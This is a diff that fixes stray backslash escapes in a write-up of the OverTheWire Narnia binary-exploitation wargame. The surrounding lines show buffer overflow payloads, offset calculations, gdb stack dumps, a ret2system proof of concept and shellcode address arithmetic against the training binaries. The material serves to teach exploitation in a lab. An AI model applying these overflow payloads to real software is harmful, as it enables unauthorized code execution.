@@ -224,7 +224,7 @@ The “Arch” row shows that this binary is a 32 bit program and whose endianne
 
 {% highlight bash %}
 ┌─[0xd4y@Writeup]─[~/business/other/overthewire/narnia]  
-└──╼ $file narnia0 narnia0: ELF 32\-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0840ec7ce39e76ebcecabacb3dffb455cfa401e9, not stripped
+└──╼ $file narnia0 narnia0: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0840ec7ce39e76ebcecabacb3dffb455cfa401e9, not stripped
 {% endhighlight %}
 
 Note how this file is not stripped which means it will contain debug information regarding symbols and functions. This will give us a little bit more information as to what is going on with the binary when we try to reverse engineer it.
@@ -259,7 +259,7 @@ val: 0x61616166
 WAY OFF!!!!
 {% endhighlight %}
 
-Observe that the value has changed from 0x41414141 to 0x61616166 confirming that there is a buffer overflow vulnerability. To calculate the offset, the \-l flag can be utilized in the pwn command:
+Observe that the value has changed from 0x41414141 to 0x61616166 confirming that there is a buffer overflow vulnerability. To calculate the offset, the -l flag can be utilized in the pwn command:
 
 {% highlight bash %}
 ┌─[0xd4y@Writeup]─[~/business/other/overthewire/narnia]  
@@ -462,7 +462,7 @@ Invalid address 0x62616169
 
 Observe that the EIP register has changed in value causing the instruction pointer to return to an unexpected address and crash
 
-Seeing that the EIP register is now 0x62616169, the offset can now be calculated with the \-l flag:
+Seeing that the EIP register is now 0x62616169, the offset can now be calculated with the -l flag:
 
 {% highlight bash %}
 pwndbg> cyclic -l 0x62616169  
@@ -563,7 +563,7 @@ Starting program: /narnia/narnia2 $(python -c "print 'A'*132 +'\\x98\\xcf\\xff\\
   
 Program received signal SIGSEGV, Segmentation fault.  
 0xffffcf98 in ?? ()  
-(gdb) x/100x $esp\-200  
+(gdb) x/100x $esp-200  
 0xffffd448:     0xf7e53f7b      0x00000000      0x00000002      0xf7fc5000  
 0xffffd458:     0xffffd508      0xf7e5b7f6      0xf7fc5d60      0x08048534  
 0xffffd468:     0xffffd488      0xf7e5b7d0      0xffffd488      0xf7ffd920  
@@ -654,7 +654,7 @@ Breakpoint 1, 0x0804860d in main ()                             �
 
 Viewing the esp register reveals that this string of A’s starts at 0xffffd560.
 
-(gdb) x/100x $esp\-100                                                                                                                                                
+(gdb) x/100x $esp-100                                                                                                                                                
 0xffffd4fc:     0xf7fe818a      0xf7ffda7c      0xf7ffd000      0x0804825c              
 0xffffd50c:     0xf7ffd000      0x0804825c      0x00000001      0xf7e187b8              
 0xffffd51c:     0xf7e53f7b      0xf7e1d068      0x00000002      0xf7fc5000  
@@ -681,7 +681,7 @@ copied contents of /etc/narnia_pass/narnia3 to a safer place... (/dev/null)
 
 Breakpoint 1, 0x0804860d in main ()
 
-(gdb) x/100x $esp\-100  
+(gdb) x/100x $esp-100  
 0xffffd4fc:     0xf7fe818a      0xf7ffda7c      0xf7ffd000      0x0804825c  
 0xffffd50c:     0xf7ffd000      0x0804825c      0x00000001      0xf7e187b8  
 0xffffd51c:     0xf7e53f7b      0xf7e1d068      0x00000002      0xf7fc5000  
@@ -1216,8 +1216,8 @@ Compiling and running this program, we see that it successfully executes the com
 total 24  
 drwxr-xr-x 1 0xd4y 0xd4y    16 May 11 17:08 .  
 drwxr-xr-x 1 0xd4y 0xd4y   200 May 11 17:07 ..  
-\-rwxr-xr-x 1 0xd4y 0xd4y 16608 May 11 17:08 poc  
-\-rw-r--r-- 1 0xd4y 0xd4y    71 May 11 17:07 poc.c
+-rwxr-xr-x 1 0xd4y 0xd4y 16608 May 11 17:08 poc  
+-rw-r--r-- 1 0xd4y 0xd4y    71 May 11 17:07 poc.c
 {% endhighlight %}
 
 Seeing as we can ssh into the target machine with credentials that we have received from the previous task, we can compile this same code on the target system to determine the location of the system function in memory (in other words, we do not have to leak the system function’s address). Using this address, we can point the address of the narnia6 binary to the system function and pass a command to it.
@@ -1231,8 +1231,8 @@ narnia6@narnia:/tmp/poc$ gcc -m32 poc.c -o poc
 narnia6@narnia:/tmp/poc$ ./poc  
 total 276drwxr-sr-x    2 narnia6 root   4096 May 11 18:15 .  
 drwxrws-wt 2040 root    root 262144 May 11 18:15 ..  
-\-rwxr-xr-x    1 narnia6 root   7460 May 11 18:15 poc  
-\-rw-r--r--    1 narnia6 root     84 May 11 18:15 poc.c
+-rwxr-xr-x    1 narnia6 root   7460 May 11 18:15 poc  
+-rw-r--r--    1 narnia6 root     84 May 11 18:15 poc.c
 {% endhighlight %}
 
 After doing so, we can start debugging the program with gdb:
@@ -1319,7 +1319,7 @@ extern char **environ;// tired of fixing values...
 // - morla  
 unsigned long get_sp(void) {  
       __asm__("movl %esp,%eax\\n\\t"              "and $0xff000000, %eax"              );  
-}int main(int argc, char *argv[]){       char b1[8], b2[8];       int  (*fp)(char *)=(int(*)(char *))&puts, i;       if(argc!=3){ printf("%s b1 b2\\n", argv[0]); exit(\-1); }       /* clear environ */       for(i=0; environ[i] != NULL; i++)               memset(environ[i], '\\0', strlen(environ[i]));       /* clear argz    */       for(i=3; argv[i] != NULL; i++)               memset(argv[i], '\\0', strlen(argv[i]));       strcpy(b1,argv[1]);       strcpy(b2,argv[2]);       //if(((unsigned long)fp & 0xff000000) == 0xff000000)       if(((unsigned long)fp & 0xff000000) == get_sp())               exit(\-1);  
+}int main(int argc, char *argv[]){       char b1[8], b2[8];       int  (*fp)(char *)=(int(*)(char *))&puts, i;       if(argc!=3){ printf("%s b1 b2\\n", argv[0]); exit(-1); }       /* clear environ */       for(i=0; environ[i] != NULL; i++)               memset(environ[i], '\\0', strlen(environ[i]));       /* clear argz    */       for(i=3; argv[i] != NULL; i++)               memset(argv[i], '\\0', strlen(argv[i]));       strcpy(b1,argv[1]);       strcpy(b2,argv[2]);       //if(((unsigned long)fp & 0xff000000) == 0xff000000)       if(((unsigned long)fp & 0xff000000) == get_sp())               exit(-1);  
        setreuid(geteuid(),geteuid());  
    fp(b1);       exit(1);  
 }
@@ -1406,7 +1406,7 @@ int vuln(const char *format){       char buffer[128];       int (*p
        ptrf = goodfunction;       printf("before : ptrf() = %p (%p)\\n", ptrf, &ptrf);       printf("I guess you want to come to the hackedfunction...\\n");  
        sleep(2);  
        ptrf = goodfunction;       snprintf(buffer, sizeof buffer, format);       return ptrf();  
-}int main(int argc, char **argv){       if (argc <= 1){               fprintf(stderr, "Usage: %s <buffer>\\n", argv[0]);               exit(\-1);  
+}int main(int argc, char **argv){       if (argc <= 1){               fprintf(stderr, "Usage: %s <buffer>\\n", argv[0]);               exit(-1);  
        }       exit(vuln(argv[1]));  
 }  
   
@@ -1482,7 +1482,7 @@ The program can be analyzed in a dynamic environment using gdb. This will help i
 
 {% highlight bash %}
 pwndbg> disass func                                                                                                                                                  
-Dump of assembler code for function func:                                                                                                                                      0x0804841b <+0\>:     push   ebp                                                                                                                                             0x0804841c <+1\>:     mov    ebp,esp                                                                                                                                         0x0804841e <+3\>:     sub    esp,0x18                                                                                                                                       0x08048421 <+6\>:     mov    eax,DWORD PTR [ebp+0x8]                                  0x08048424 <+9\>:     mov    DWORD PTR [ebp\-0x4],eax                                                                                                                         0x08048427 <+12\>:    push   0x14                                                     0x08048429 <+14\>:    push   0x0                                                     0x0804842b <+16\>:    lea    eax,[ebp\-0x18]                                          0x0804842e <+19\>:    push   eax                                                     0x0804842f <+20\>:    call   0x8048300 <memset@plt>                                                                                                                          0x08048434 <+25\>:    add    esp,0xc                                                 0x08048437 <+28\>:    mov    DWORD PTR ds:0x80497b0,0x0                               0x08048441 <+38\>:    jmp    0x8048469 <func+78\>                                      0x08048443 <+40\>:    mov    eax,ds:0x80497b0                                         0x08048448 <+45\>:    mov    edx,DWORD PTR ds:0x80497b0                                                                                                                     0x0804844e <+51\>:    mov    ecx,edx                                                                                                                                         0x08048450 <+53\>:    mov    edx,DWORD PTR [ebp\-0x4]                                  0x08048453 <+56\>:    add    edx,ecx                                                 0x08048455 <+58\>:    movzx  edx,BYTE PTR [edx]                                      0x08048458 <+61\>:    mov    BYTE PTR [ebp+eax*1\-0x18],dl  0x0804845c <+65\>:    mov    eax,ds:0x80497b0  0x08048461 <+70\>:    add    eax,0x1  0x08048464 <+73\>:    mov    ds:0x80497b0,eax  0x08048469 <+78\>:    mov    eax,ds:0x80497b0       0x0804846e <+83\>:    mov    edx,eax  0x08048470 <+85\>:    mov    eax,DWORD PTR [ebp\-0x4]  0x08048473 <+88\>:    add    eax,edx  0x08048475 <+90\>:    movzx  eax,BYTE PTR [eax]  0x08048478 <+93\>:    test   al,al  0x0804847a <+95\>:    jne    0x8048443 <func+40\>  0x0804847c <+97\>:    lea    eax,[ebp\-0x18]  0x0804847f <+100\>:   push   eax  0x08048480 <+101\>:   push   0x8048550  0x08048485 <+106\>:   call   0x80482e0 <printf@plt>  0x0804848a <+111\>:   add    esp,0x8  0x0804848d <+114\>:   nop  0x0804848e <+115\>:   leave   0x0804848f <+116\>:   ret   
+Dump of assembler code for function func:                                                                                                                                      0x0804841b <+0\>:     push   ebp                                                                                                                                             0x0804841c <+1\>:     mov    ebp,esp                                                                                                                                         0x0804841e <+3\>:     sub    esp,0x18                                                                                                                                       0x08048421 <+6\>:     mov    eax,DWORD PTR [ebp+0x8]                                  0x08048424 <+9\>:     mov    DWORD PTR [ebp-0x4],eax                                                                                                                         0x08048427 <+12\>:    push   0x14                                                     0x08048429 <+14\>:    push   0x0                                                     0x0804842b <+16\>:    lea    eax,[ebp-0x18]                                          0x0804842e <+19\>:    push   eax                                                     0x0804842f <+20\>:    call   0x8048300 <memset@plt>                                                                                                                          0x08048434 <+25\>:    add    esp,0xc                                                 0x08048437 <+28\>:    mov    DWORD PTR ds:0x80497b0,0x0                               0x08048441 <+38\>:    jmp    0x8048469 <func+78\>                                      0x08048443 <+40\>:    mov    eax,ds:0x80497b0                                         0x08048448 <+45\>:    mov    edx,DWORD PTR ds:0x80497b0                                                                                                                     0x0804844e <+51\>:    mov    ecx,edx                                                                                                                                         0x08048450 <+53\>:    mov    edx,DWORD PTR [ebp-0x4]                                  0x08048453 <+56\>:    add    edx,ecx                                                 0x08048455 <+58\>:    movzx  edx,BYTE PTR [edx]                                      0x08048458 <+61\>:    mov    BYTE PTR [ebp+eax*1-0x18],dl  0x0804845c <+65\>:    mov    eax,ds:0x80497b0  0x08048461 <+70\>:    add    eax,0x1  0x08048464 <+73\>:    mov    ds:0x80497b0,eax  0x08048469 <+78\>:    mov    eax,ds:0x80497b0       0x0804846e <+83\>:    mov    edx,eax  0x08048470 <+85\>:    mov    eax,DWORD PTR [ebp-0x4]  0x08048473 <+88\>:    add    eax,edx  0x08048475 <+90\>:    movzx  eax,BYTE PTR [eax]  0x08048478 <+93\>:    test   al,al  0x0804847a <+95\>:    jne    0x8048443 <func+40\>  0x0804847c <+97\>:    lea    eax,[ebp-0x18]  0x0804847f <+100\>:   push   eax  0x08048480 <+101\>:   push   0x8048550  0x08048485 <+106\>:   call   0x80482e0 <printf@plt>  0x0804848a <+111\>:   add    esp,0x8  0x0804848d <+114\>:   nop  0x0804848e <+115\>:   leave   0x0804848f <+116\>:   ret   
 {% endhighlight %}
 
 A breakpoint was then set at the nop operation, and an input of 5 A’s was passed (this amount was chosen arbitrarily):
@@ -1541,7 +1541,7 @@ A*20 + ADDRESS_TO_LOCAL_8 + ‘A’*6
 When we passed 6 A’s into the buffer, the address to local_8 was 0xfffd2f8. If we are to input 14 more A’s followed by the address to local_8 (which is four bytes) followed by another 6 A’s, then the resulting address to local_8 would be 0xffffd2f8 - (14+4+6).
 
 {% highlight bash %}
-\>>\> hex(0xffffd2f8\-24)  
+\>>\> hex(0xffffd2f8-24)  
 '0xffffd2e0'
 {% endhighlight %}
 
@@ -1601,7 +1601,7 @@ narnia8@narnia:/narnia$ ./narnia8 $(python -c "print 'A'*20")|xxd          
 Here we can see that local_8 is located at 0xffffd7d1. Subtracting this address by 4 bytes (local_8c address) + 4 bytes (junk) + 4 bytes (shellcode address) + 33 bytes (shellcode[[13]](#ftnt13)), we get the local_8 address as 0xffffd7a4:
 
 {% highlight bash %}
-\>>> hex(0xffffd7d1\-(4+4+4+33))  
+\>>> hex(0xffffd7d1-(4+4+4+33))  
 '0xffffd7a4'
 {% endhighlight %}
 
